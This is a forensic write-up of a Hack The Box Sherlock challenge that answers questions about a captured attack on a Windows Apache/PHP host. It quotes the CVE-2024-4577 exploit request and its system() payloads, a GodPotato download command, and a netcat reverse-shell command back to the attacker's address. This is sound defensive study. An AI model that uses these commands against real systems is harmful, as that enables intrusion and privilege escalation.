Original Notes

Packet Puzzle (HTB)

Scenario

You are a junior security analyst at a small Japanese cryptocurrency trading company. After detecting suspicious activity on the internal network, you exported a PCAP for further investigation. Analyze this capture to determine whether the environment was compromised and reconstruct the attacker’s actions.

https://app.hackthebox.com/sherlocks/Packet Puzzle

1- What is the source IP address of the attacker involved in this Attack?

192.168.170.128

we can see that 192.168.170.128 is performing port scanning on 192.168.170.130

2- How many open ports did the attacker discover on the victim's system?

8

filtering with ip.dst == 192.168.170.128 to view the responses shows replies from ports 22, 80, 135, 443, 445, 3389 and 5357, which totals eight open ports observed.

3- What is the first open port that responded on the victim's system during reconnaissance?

22

4- What is the CVE identifier for the vulnerability exploited by the attacker?

CVE-2024-4577

https://www.akamai.com/blog/security-research/2024-php-exploit-cve-one-day-after-disclosure we can see in the HTTP traffic the POST /?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input which matches CVE-2024-4577, a PHP-CGI option-injection bug on Windows caused by improper character-encoding handling in CGI mode that lets an attacker inject PHP runtime options like allow_url_include=1 and auto_prepend_file=php://input so PHP in the POST body gets executed. Additional observed actions from the capture include repeated POSTs with <?php system('whoami');?>, <?php system('whoami /priv');?>, <?php system('whoami /all');?>, <?php system('pwd');?>, <?php system('dir');?> and a larger POST carrying a PowerShell reverse-shell one-liner, confirming remote code execution against the Apache/PHP host (server banner: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25).

5- What is the name and version of the vulnerable product exploited to get RCE?

PHP 8.1.25

6- What is the username of the victim account?

cristo

7- At what timestamp did the attacker execute the command to gain their initial foothold on the victim system?

2025-01-22 09:47:32

this POST triggered a PowerShell TCP reverse shell that connected back to 192.168.170.128:4545 and provided the attacker with an interactive shell.

8- What is the MITRE ATT&CK technique ID used by the attacker to gain an initial foothold?

T1190

exploiting a public-facing application

9- What is the name of the malicious executable the attacker downloaded and executed in memory to facilitate privilege escalation on the endpoint?

GodPotato-NET4.exe

the attacker downloaded GodPotato-NET4.exe and saved it as TimeProvider.exe using iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -Outfile TimeProvider.exe. GodPotato-NET4 is a .NET variant of the RottenPotato/GodPotato family that abuses COM/DCOM and token impersonation (relying on SeImpersonatePrivilege or similar) to try to obtain or impersonate a SYSTEM token via RPC/DCOM object marshaling.

10- What is the command line used by the attacker while performing privilege escalation?

./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd”

the attacker executed TimeProvider.exe with a command that runs the downloaded netcat binary (time.exe) to connect back to 192.168.170.128 on port 5555 and spawn a shell if the escalation succeeded.

11- The attacker failed to escalate privileges and was given an error. What is the error?

Cannot create process Win32Error:2

GodPotato output shows DCOM/COM interaction and that a SYSTEM token was found or impersonated, but the tool failed to create a SYSTEM process and returned Cannot create process Win32Error:2.
